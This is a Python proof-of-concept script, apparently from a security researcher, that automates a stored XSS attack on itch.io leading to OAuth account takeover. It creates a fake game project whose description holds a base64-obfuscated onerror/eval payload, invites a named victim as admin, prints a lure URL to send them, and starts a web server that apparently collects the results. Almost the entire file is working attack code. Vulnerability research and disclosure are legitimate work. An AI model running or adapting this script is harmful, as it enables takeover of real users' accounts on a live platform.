
import json
import random
import base64

import subprocess
import urllib.parse

import httpx

from string import ascii_letters
from dataclasses import dataclass

@dataclass
class Settings:
    UserCookie: str
    UserToken: str
    ServerUrl: str

def buildExploit(serverUrl):
    with open('resources/payload.js', 'r') as original:
        data = original.read()
    
    payload = f"let server = \"{serverUrl}\"\n"+data
    encodedPayload = urllib.parse.quote_plus(f"""<img src='x' onerror='eval(atob("{base64.b64encode(bytes(payload, 'utf-8')).decode('utf-8')}"))'>test</img>""")
     
    return encodedPayload

def startGunicorn():
    command = [
        "gunicorn",
        "--bind", "0.0.0.0:8080",
        "resources.webserver.app:app"
    ]
    subprocess.run(command)

class ItchIO:
    def __init__(self, cookie, token) -> None:
        self.cookie = cookie
        self.token = token

        self.cookies = {
            'itchio': self.cookie,
            'itchio_token': self.token,
        }
        self.headers = {
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
        }

    def createProject(self, payload: str) -> dict:
        """Creates Fake Project and Drops Payload In Game Description"""
        randomTitle = ''.join(random.choice(ascii_letters) for i in range(12))

        data = f"csrf_token={self.token}&game%5Btitle%5D={randomTitle}&game%5Bslug%5D={randomTitle}&game%5Bshort_text%5D=&game%5Buser_classification%5D=game&game%5Btype%5D=default&game%5Brelease_status%5D=released&game%5Bpayment_mode%5D=free&game%5Bmin_price%5D=%240.00&game%5Bsuggested_price%5D=%242.00&game%5Bclassname%5D=&game%5Bdescription%5D={payload}&game%5Bgenre%5D=none&game%5Btags%5D=&game%5Bsteam_url%5D=&game%5Bapp_store_url%5D=&game%5Bgoogle_play_url%5D=&game%5Bamazon_appstore_url%5D=&game%5Bwindows_phone_url%5D=&game%5Bnoun%5D=&game%5Binstructions%5D=&game%5Bcommunity_type%5D=topic&game%5Bpublished%5D=draft&game%5Bcover_image_id%5D=&game%5Bvideo_url%5D="

        response = httpx.post('https://itch.io/game/new', data=data, cookies=self.cookies, headers=self.headers)
        responseData = response.json()

        return str(responseData['game']['id'])

    def inviteAdmin(self, projectId: str, victim: str) -> None:
        """Invites a User To Be An Admin"""
        data = f"csrf_token={self.token}&action=add&username={victim}"

        #mfw it turns out i didn't include the data param the whole time
        response = httpx.post(f"https://itch.io/game/admins/{projectId}", cookies=self.cookies, headers=self.headers, data=data)
        print(response.status_code)
        print(f"https://itch.io/game/accept-admin/{projectId}/{response.headers['location'].split('=')[1]}")

if __name__ == "__main__":
    
    print("""
    ┌─┐┌─┐┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┌┬┐  /\\_/\\
    └─┐│  ├┬┘├─┤ │ │  ├─┤├┤  ││ ( ^.^ )
    └─┘└─┘┴└─┴ ┴ ┴ └─┘┴ ┴└─┘─┴┘  >   <
    @BenCantCode | itch.io XSS -> OAUTH account takeover P.O.C
    <──>
    """)

    Settings.UserCookie = input("Enter Your itch.io Cookie ─> ")
    Settings.UserToken = input("Enter Your itch.io CSRF Token ─> ")
    Settings.VictimName = input("Enter Victim Username ─> ")  
    Settings.ServerUrl = "http://127.0.0.1:8080"

    app = ItchIO(Settings.UserCookie, Settings.UserToken)

    print("[Starting STAGE 1]")
    
    projectId = app.createProject(buildExploit(Settings.ServerUrl))
    print("<Created Malicious Project...>")
    
    badUrl = app.inviteAdmin(projectId, Settings.VictimName)
    print(f"Send URL To Victim: {badUrl}")
    
    print("<[Stage 2] Starting And Forwarding Web Server, All further updates will be via webhook.>")

    startGunicorn()